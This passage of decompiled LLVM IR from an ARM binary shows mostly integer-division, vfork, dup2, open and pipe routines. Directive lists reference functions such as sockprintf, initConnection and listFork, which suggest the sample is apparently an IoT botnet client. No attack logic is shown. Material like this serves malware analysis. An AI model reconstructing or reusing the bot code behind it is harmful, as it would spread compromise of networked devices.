  uselistorder i32 %v3_12378, { 1, 0 }
  uselistorder i32 %v1_1235c, { 1, 0 }
  uselistorder i32 %v5_12298, { 1, 0 }
  uselistorder i32 %v1_1222c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_12248, { 1, 0 }
  uselistorder i32 %v2_1223c, { 1, 0 }
  uselistorder i32 %v2_12780, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_12a24, { 3, 0, 1, 2 }
  uselistorder i32 %v2_12a14, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %v2_120fc, { 1, 0 }
  uselistorder i32 %v0_120e4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12098, { 1, 0, 2 }
  uselistorder i32 %v2_11ffc, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_203a0.831 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28 }
  uselistorder i32 ()* @listFork, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2a538.68, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_30798.71, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @sockprintf, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 6, 5, 4, 3, 2, 1, 12, 11, 10, 9, 8, 7, 22, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_3078c.483, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32* @global_var_2a530.50, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 0, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 2, 1, 3, 0 }
  uselistorder [2 x i8]* @global_var_20330.800, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_20330.800 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 21, 22, 23, 24, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 0, 1, 2, 3, 4, 5, 6, 25, 18 }
  uselistorder i32 ptrtoint (i32* @global_var_20318.796 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12a04.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_129c0, { 1, 0 }
  uselistorder label %dec_label_pc_12970, { 1, 0 }
  uselistorder label %dec_label_pc_1289c, { 1, 0 }
  uselistorder label %dec_label_pc_12870, { 1, 0 }
  uselistorder label %dec_label_pc_12838, { 1, 0 }
  uselistorder label %dec_label_pc_12710, { 1, 0 }
  uselistorder label %dec_label_pc_126ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_126dc, { 1, 0 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
  uselistorder label %dec_label_pc_125d0, { 1, 0 }
  uselistorder label %dec_label_pc_12594, { 1, 0 }
  uselistorder label %dec_label_pc_124bc, { 1, 0 }
  uselistorder label %dec_label_pc_12444, { 1, 0 }
  uselistorder label %dec_label_pc_123b4, { 1, 0 }
  uselistorder label %dec_label_pc_1227c, { 1, 0 }
  uselistorder label %dec_label_pc_12194, { 1, 0 }
  uselistorder label %dec_label_pc_12184.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1216c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_120e0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11fb8, { 1, 0 }
  uselistorder label %dec_label_pc_11f44, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12a94 = load i32, i32* @r1, align 4
  %v1_12a94 = add i32 %v0_12a94, -1
  store i32 %v1_12a94, i32* %r2.global-to-local, align 4
  %v2_12a94 = icmp eq i32 %v0_12a94, 0
  %v7_12a94 = icmp eq i32 %v0_12a94, 1
  %v0_12a98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12a94, i32 %v0_12a98)
  br i1 %v2_12a94, label %dec_label_pc_12b7c, label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %entry
  %v0_12aa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_12aa0 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12aa0, %v1_12aa0
  br i1 %tmp, label %dec_label_pc_12aa8, label %dec_label_pc_12b34

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12aa0
  %v1_12aa8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12aa8 = and i32 %v1_12aa8, %v1_12aa0
  %v4_12aa8 = icmp eq i32 %v2_12aa8, 0
  br i1 %v4_12aa8, label %dec_label_pc_12b40, label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12aa8
  %v3_12ab0 = icmp ult i32 %v1_12aa0, 536870912
  br i1 %v3_12ab0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12ab0
  %v4_12ab4 = mul i32 %v1_12aa0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12ab0, %.thread
  %v0_12ad4.pr36.ph = phi i32 [ %v4_12ab4, %.thread ], [ %v1_12aa0, %dec_label_pc_12ab0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12ab0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12ad4.pr36 = phi i32 [ %v4_12ac8, %bb81 ], [ %v0_12ad4.pr36.ph, %.preheader.preheader ]
  %v1_12acc = phi i32 [ %v4_12acc, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12ac0 = icmp ugt i32 %v0_12ad4.pr36, 268435455
  br i1 %v2_12ac0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12ad4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12ac4 = icmp ult i32 %v0_12ad4.pr36, %v0_12aa0
  br i1 %v4_12ac4, label %bb80, label %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12ac8 = and i32 %v0_12ad4.pr36, 268435456
  %v3_12ac8 = icmp eq i32 %v2_12ac8, 0
  %v4_12ac8 = mul i32 %v0_12ad4.pr36, 16
  br i1 %v3_12ac8, label %bb81, label %dec_label_pc_12ad4.loopexit

bb81:                                             ; preds = %bb80
  %v2_12acc = and i32 %v1_12acc, 268435456
  %v3_12acc = icmp eq i32 %v2_12acc, 0
  %v4_12acc = mul i32 %v1_12acc, 16
  br i1 %v3_12acc, label %.preheader, label %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit

dec_label_pc_12ad4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_12ae048.ph = phi i32 [ %v1_12acc, %bb ], [ %v4_12acc, %bb81 ]
  %v0_12ad4.pr38.ph = phi i32 [ %v0_12ad4.pr36, %bb ], [ %v4_12ac8, %bb81 ]
  br label %dec_label_pc_12ad4thread-pre-split.loopexit

dec_label_pc_12ad4thread-pre-split.loopexit:      ; preds = %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12ae048 = phi i32 [ %v1_12acc, %.thread2 ], [ %v1_12ae048.ph, %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit ]
  %v0_12ad4.pr38 = phi i32 [ %v0_12ad4.pr36, %.thread2 ], [ %v0_12ad4.pr38.ph, %dec_label_pc_12ad4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12ad4thread-pre-split

dec_label_pc_12ad4thread-pre-split:               ; preds = %dec_label_pc_12ad4thread-pre-split.loopexit, %bb83
  %v1_12ae046 = phi i32 [ %v1_12ae048, %dec_label_pc_12ad4thread-pre-split.loopexit ], [ %v3_12ae0, %bb83 ]
  %v0_12ad4.pr = phi i32 [ %v0_12ad4.pr38, %dec_label_pc_12ad4thread-pre-split.loopexit ], [ %v3_12adc, %bb83 ]
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12ad4.loopexit, %dec_label_pc_12ad4thread-pre-split
  %v1_12ae0 = phi i32 [ %v1_12ae046, %dec_label_pc_12ad4thread-pre-split ], [ %v1_12acc, %dec_label_pc_12ad4.loopexit ]
  %v1_12adc = phi i32 [ %v0_12ad4.pr, %dec_label_pc_12ad4thread-pre-split ], [ %v4_12ac8, %dec_label_pc_12ad4.loopexit ]
  %v2_12ad4 = icmp slt i32 %v1_12adc, 0
  br i1 %v2_12ad4, label %dec_label_pc_12ae8, label %bb82

bb82:                                             ; preds = %dec_label_pc_12ad4
  %v4_12ad8 = icmp ult i32 %v1_12adc, %v0_12aa0
  br i1 %v4_12ad8, label %bb83, label %dec_label_pc_12ae8

bb83:                                             ; preds = %bb82
  %v3_12adc = mul i32 %v1_12adc, 2
  %v2_12ae0 = icmp slt i32 %v1_12ae0, 0
  %v3_12ae0 = mul i32 %v1_12ae0, 2
  br i1 %v2_12ae0, label %dec_label_pc_12ae8, label %dec_label_pc_12ad4thread-pre-split

dec_label_pc_12ae8:                               ; preds = %bb82, %dec_label_pc_12ad4, %bb83
  %v2_12af459 = phi i32 [ %v3_12ae0, %bb83 ], [ %v1_12ae0, %bb82 ], [ %v1_12ae0, %dec_label_pc_12ad4 ]
  %v1_12aec51 = phi i32 [ %v3_12adc, %bb83 ], [ %v1_12adc, %bb82 ], [ %v1_12adc, %dec_label_pc_12ad4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %.thread11, %dec_label_pc_12ae8
  %v1_12b20 = phi i32 [ %v4_12b20, %.thread11 ], [ %v2_12af459, %dec_label_pc_12ae8 ]
  %v1_12af4 = phi i32 [ %v0_12b2c, %.thread11 ], [ 0, %dec_label_pc_12ae8 ]
  %v1_12b24 = phi i32 [ %v4_12b24, %.thread11 ], [ %v1_12aec51, %dec_label_pc_12ae8 ]
  %v1_12af0 = phi i32 [ %v0_12b1c, %.thread11 ], [ %v0_12aa0, %dec_label_pc_12ae8 ]
  %v3_12aec = icmp ult i32 %v1_12af0, %v1_12b24
  br i1 %v3_12aec, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12aec
  %v3_12af0 = sub i32 %v1_12af0, %v1_12b24
  store i32 %v3_12af0, i32* %r0.global-to-local, align 4
  %v3_12af4 = or i32 %v1_12af4, %v1_12b20
  store i32 %v3_12af4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12aec, %bb84
  %v1_12afc = phi i32 [ %v1_12af0, %dec_label_pc_12aec ], [ %v3_12af0, %bb84 ]
  %v1_12b00 = phi i32 [ %v1_12af4, %dec_label_pc_12aec ], [ %v3_12af4, %bb84 ]
  %v4_12af8 = udiv i32 %v1_12b24, 2
  %v6_12af8 = icmp ult i32 %v1_12afc, %v4_12af8
  br i1 %v6_12af8, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12afc = urem i32 %v1_12b24, 2
  %v4_12afc = icmp eq i32 %v3_12afc, 0
  %v6_12afc = sub i32 %v1_12afc, %v4_12af8
  store i32 %v6_12afc, i32* %r0.global-to-local, align 4
  br i1 %v4_12afc, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12b00 = udiv i32 %v1_12b20, 2
  %v6_12b00 = or i32 %v1_12b00, %v5_12b00
  store i32 %v6_12b00, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12b08 = phi i32 [ %v6_12afc, %bb85 ], [ %v1_12afc, %.thread7 ], [ %v6_12afc, %bb86 ]
  %v1_12b0c = phi i32 [ %v1_12b00, %bb85 ], [ %v1_12b00, %.thread7 ], [ %v6_12b00, %bb86 ]
  %v4_12b04 = udiv i32 %v1_12b24, 4
  %v6_12b04 = icmp ult i32 %v1_12b08, %v4_12b04
  br i1 %v6_12b04, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12b08 = and i32 %v1_12b24, 2
  %v4_12b08 = icmp eq i32 %v3_12b08, 0
  %v6_12b08 = sub i32 %v1_12b08, %v4_12b04
  store i32 %v6_12b08, i32* %r0.global-to-local, align 4
  br i1 %v4_12b08, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12b0c = udiv i32 %v1_12b20, 4
  %v6_12b0c = or i32 %v1_12b0c, %v5_12b0c
  store i32 %v6_12b0c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12b14 = phi i32 [ %v6_12b08, %bb87 ], [ %v1_12b08, %.thread8 ], [ %v6_12b08, %bb88 ]
  %v1_12b18 = phi i32 [ %v1_12b0c, %bb87 ], [ %v1_12b0c, %.thread8 ], [ %v6_12b0c, %bb88 ]
  %v4_12b10 = udiv i32 %v1_12b24, 8
  %v6_12b10 = icmp ult i32 %v1_12b14, %v4_12b10
  br i1 %v6_12b10, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12b14 = and i32 %v1_12b24, 4
  %v4_12b14 = icmp eq i32 %v3_12b14, 0
  %v6_12b14 = sub i32 %v1_12b14, %v4_12b10
  store i32 %v6_12b14, i32* %r0.global-to-local, align 4
  br i1 %v4_12b14, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12b18 = udiv i32 %v1_12b20, 8
  %v6_12b18 = or i32 %v1_12b18, %v5_12b18
  store i32 %v6_12b18, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_12b2c = phi i32 [ %v1_12b18, %bb89 ], [ %v1_12b18, %.thread9 ], [ %v6_12b18, %bb90 ]
  %v0_12b1c = phi i32 [ %v6_12b14, %bb89 ], [ %v1_12b14, %.thread9 ], [ %v6_12b14, %bb90 ]
  %v2_12b1c = icmp eq i32 %v0_12b1c, 0
  br i1 %v2_12b1c, label %dec_label_pc_12b2c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_12b20, 16
  br i1 %tmp138, label %dec_label_pc_12b2c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_12b20 = udiv i32 %v1_12b20, 16
  %v4_12b24 = udiv i32 %v1_12b24, 16
  br label %dec_label_pc_12aec

dec_label_pc_12b2c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_12b2c, i32* %r0.global-to-local, align 4
  ret i32 %v0_12b2c

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12aa0
  %v9_12aa0 = icmp eq i32 %v0_12aa0, %v1_12aa0
  %. = zext i1 %v9_12aa0 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_12b40:                               ; preds = %dec_label_pc_12aa8
  %v2_12b40 = icmp ugt i32 %v1_12aa0, 65535
  br i1 %v2_12b40, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12b40
  %v2_12b44 = and i32 %v1_12aa0, 32768
  %v3_12b44 = icmp eq i32 %v2_12b44, 0
  %v4_12b44 = udiv i32 %v1_12aa0, 65536
  br i1 %v3_12b44, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12b40
  %v0_12b5065 = phi i32 [ %v1_12aa0, %dec_label_pc_12b40 ], [ %v4_12b44, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12b54 = phi i32 [ %v0_12b5065, %.thread16 ], [ %v4_12b44, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12b50 = icmp ugt i32 %v1_12b54, 255
  br i1 %v2_12b50, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12b54 = and i32 %v1_12b54, 128
  %v3_12b54 = icmp eq i32 %v2_12b54, 0
  %v4_12b54 = udiv i32 %v1_12b54, 256
  br i1 %v3_12b54, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12b58 = or i32 %storemerge, 8
  store i32 %v2_12b58, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12b64 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12b58, %bb98 ]
  %v1_12b60 = phi i32 [ %v1_12b54, %bb96 ], [ %v4_12b54, %bb97 ], [ %v4_12b54, %bb98 ]
  %v2_12b5c = icmp ugt i32 %v1_12b60, 15
  br i1 %v2_12b5c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12b60 = and i32 %v1_12b60, 8
  %v3_12b60 = icmp eq i32 %v2_12b60, 0
  %v4_12b60 = udiv i32 %v1_12b60, 16
  br i1 %v3_12b60, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12b64 = add nsw i32 %v1_12b64, 4
  store i32 %v2_12b64, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12b6c = phi i32 [ %v1_12b64, %.thread17 ], [ %v1_12b64, %bb99 ], [ %v2_12b64, %bb100 ]
  %v5_12b70 = phi i32 [ %v1_12b60, %.thread17 ], [ %v4_12b60, %bb99 ], [ %v4_12b60, %bb100 ]
  %v2_12b68 = icmp ugt i32 %v5_12b70, 3
  %v7_12b68 = icmp eq i32 %v5_12b70, 4
  %v2_12b6c = xor i1 %v7_12b68, true
  %v3_12b6c = and i1 %v2_12b68, %v2_12b6c
  br i1 %v3_12b6c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12b6c = add nsw i32 %v4_12b6c, 3
  store i32 %v5_12b6c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12b70 = phi i32 [ %v4_12b6c, %.thread18 ], [ %v5_12b6c, %bb101 ]
  %v2_12b70 = xor i1 %v2_12b68, true
  %v3_12b70 = or i1 %v7_12b68, %v2_12b70
  br i1 %v3_12b70, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12b70 = udiv i32 %v5_12b70, 2
  %v9_12b70 = add i32 %v4_12b70, %v8_12b70
  store i32 %v9_12b70, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12b74 = phi i32 [ %v4_12b70, %bb102 ], [ %v9_12b70, %bb103 ]
  %v6_12b74 = lshr i32 %v0_12aa0, %v1_12b74
  store i32 %v6_12b74, i32* %r0.global-to-local, align 4
  ret i32 %v6_12b74

dec_label_pc_12b7c:                               ; preds = %entry
  %v0_12b80 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12b70, { 1, 0 }
  uselistorder i1 %v7_12b68, { 1, 0 }
  uselistorder i32 %v4_12b60, { 1, 0 }
  uselistorder i32 %v1_12b60, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12b58, { 1, 0 }
  uselistorder i32 %v4_12b54, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b54, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b44, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_12b1c, { 1, 0 }
  uselistorder i32 %v0_12b2c, { 1, 0, 2 }
  uselistorder i32 %v4_12b10, { 1, 0 }
  uselistorder i32 %v1_12b18, { 1, 2, 0 }
  uselistorder i32 %v4_12b04, { 1, 0 }
  uselistorder i32 %v1_12b0c, { 1, 2, 0 }
  uselistorder i32 %v4_12af8, { 1, 0 }
  uselistorder i32 %v1_12b00, { 1, 2, 0 }
  uselistorder i32 %v1_12b24, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12af4, { 1, 0 }
  uselistorder i32 %v1_12b20, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12ae0, { 1, 0 }
  uselistorder i32 %v3_12adc, { 1, 0 }
  uselistorder i32 %v1_12adc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12ae0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12acc, { 1, 0 }
  uselistorder i32 %v4_12ac8, { 2, 1, 0 }
  uselistorder i32 %v1_12acc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12ad4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12aa0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12aa0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12a94, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12b2c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12ae8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ad4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12b94 = udiv i32 %arg1, %arg2
  ret i32 %v2_12b94
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_12bb0 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_12bb0
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_12bc0 = load i32, i32* @r7, align 4
  store i32 %v0_12bc0, i32* @ip, align 4
  %v0_12bd0 = load i32, i32* @r0, align 4
  %v2_12bd0 = icmp ugt i32 %v0_12bd0, -4097
  br i1 %v2_12bd0, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_12bd0

bb1:                                              ; preds = %entry
  %v4_12bdc = icmp eq i32 %v0_12bd0, -38
  br i1 %v4_12bdc, label %dec_label_pc_12be4, label %bb2

dec_label_pc_12be4:                               ; preds = %bb1
  store i32 %v0_12bc0, i32* @ip, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12be4, %bb1
  %v0_12bfc = call i32 @__syscall_error()
  ret i32 %v0_12bfc
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c00 = load i32, i32* @r7, align 4
  store i32 %v3_12c00, i32* %stack_var_-8, align 4
  %v0_12c0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c0c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c0c, -4095
  br i1 %tmp, label %dec_label_pc_12c2c, label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %entry
  %v0_12c1c = call i32 @__GI___errno_location()
  %v0_12c20 = load i32, i32* %r7.global-to-local, align 4
  %v1_12c20 = sub i32 0, %v0_12c20
  %v2_12c24 = inttoptr i32 %v0_12c1c to i32*
  store i32 %v1_12c20, i32* %v2_12c24, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c2c

dec_label_pc_12c2c:                               ; preds = %entry, %dec_label_pc_12c1c
  %v1_12c30 = phi i32 [ %v0_12c0c, %entry ], [ -1, %dec_label_pc_12c1c ]
  %v2_12c2c = phi i32 [ %v3_12c00, %entry ], [ %v2_12c2c.pre, %dec_label_pc_12c1c ]
  store i32 %v2_12c2c, i32* @r7, align 4
  ret i32 %v1_12c30

; uselistorder directives
  uselistorder i32 %v0_12c0c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c2c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_12c34 = load i32, i32* @r2, align 4
  %v9_12c34 = load i32, i32* @r3, align 4
  store i32 %v9_12c34, i32* %stack_var_-4, align 4
  %v1_12c44 = and i32 %arg2, 64
  %v2_12c44 = icmp eq i32 %v1_12c44, 0
  br i1 %v2_12c44, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_12c4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_12c4c, i32* @r3, align 4
  %phitmp = urem i32 %v6_12c34, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_12c50 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_12c50, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12c80, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %.thread
  %v0_12c70 = call i32 @__GI___errno_location()
  %v0_12c74 = load i32, i32* %r7.global-to-local, align 4
  %v1_12c74 = sub i32 0, %v0_12c74
  store i32 %v1_12c74, i32* @r3, align 4
  %v2_12c78 = inttoptr i32 %v0_12c70 to i32*
  store i32 %v1_12c74, i32* %v2_12c78, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %.thread, %dec_label_pc_12c70
  %v0_12c80 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_12c70 ]
  ret i32 %v0_12c80

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c80, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c94 = load i32, i32* @r7, align 4
  store i32 %v3_12c94, i32* %stack_var_-8, align 4
  %v0_12ca0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ca0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ca0, -4095
